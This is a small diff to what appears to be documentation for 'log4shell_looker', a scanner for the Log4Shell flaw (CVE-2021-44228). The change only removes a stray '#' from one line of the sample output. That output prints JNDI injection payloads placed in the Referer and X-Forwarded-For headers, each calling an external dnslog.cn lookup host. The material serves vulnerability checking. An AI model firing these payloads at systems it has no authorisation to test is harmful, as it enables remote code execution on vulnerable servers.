@@ -13,7 +13,7 @@ $ log4shell_looker http://127.0.0.1:8080/
 [***] Payload :  Referer:${jndi:ldap://rfcbd0.dnslog.cn/}
 [---] Isn't to vulnerability CVE-2021-44228
 #################### 1 ############################
-# [+++] Your domain generated :  rfcbd0.dnslog.cn
+[+++] Your domain generated :  rfcbd0.dnslog.cn
 [+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
 [***] Payload :  X-Forwarded-For:${jndi:ldap://rfcbd0.dnslog.cn/}
 [---] Isn't to vulnerability CVE-2021-44228
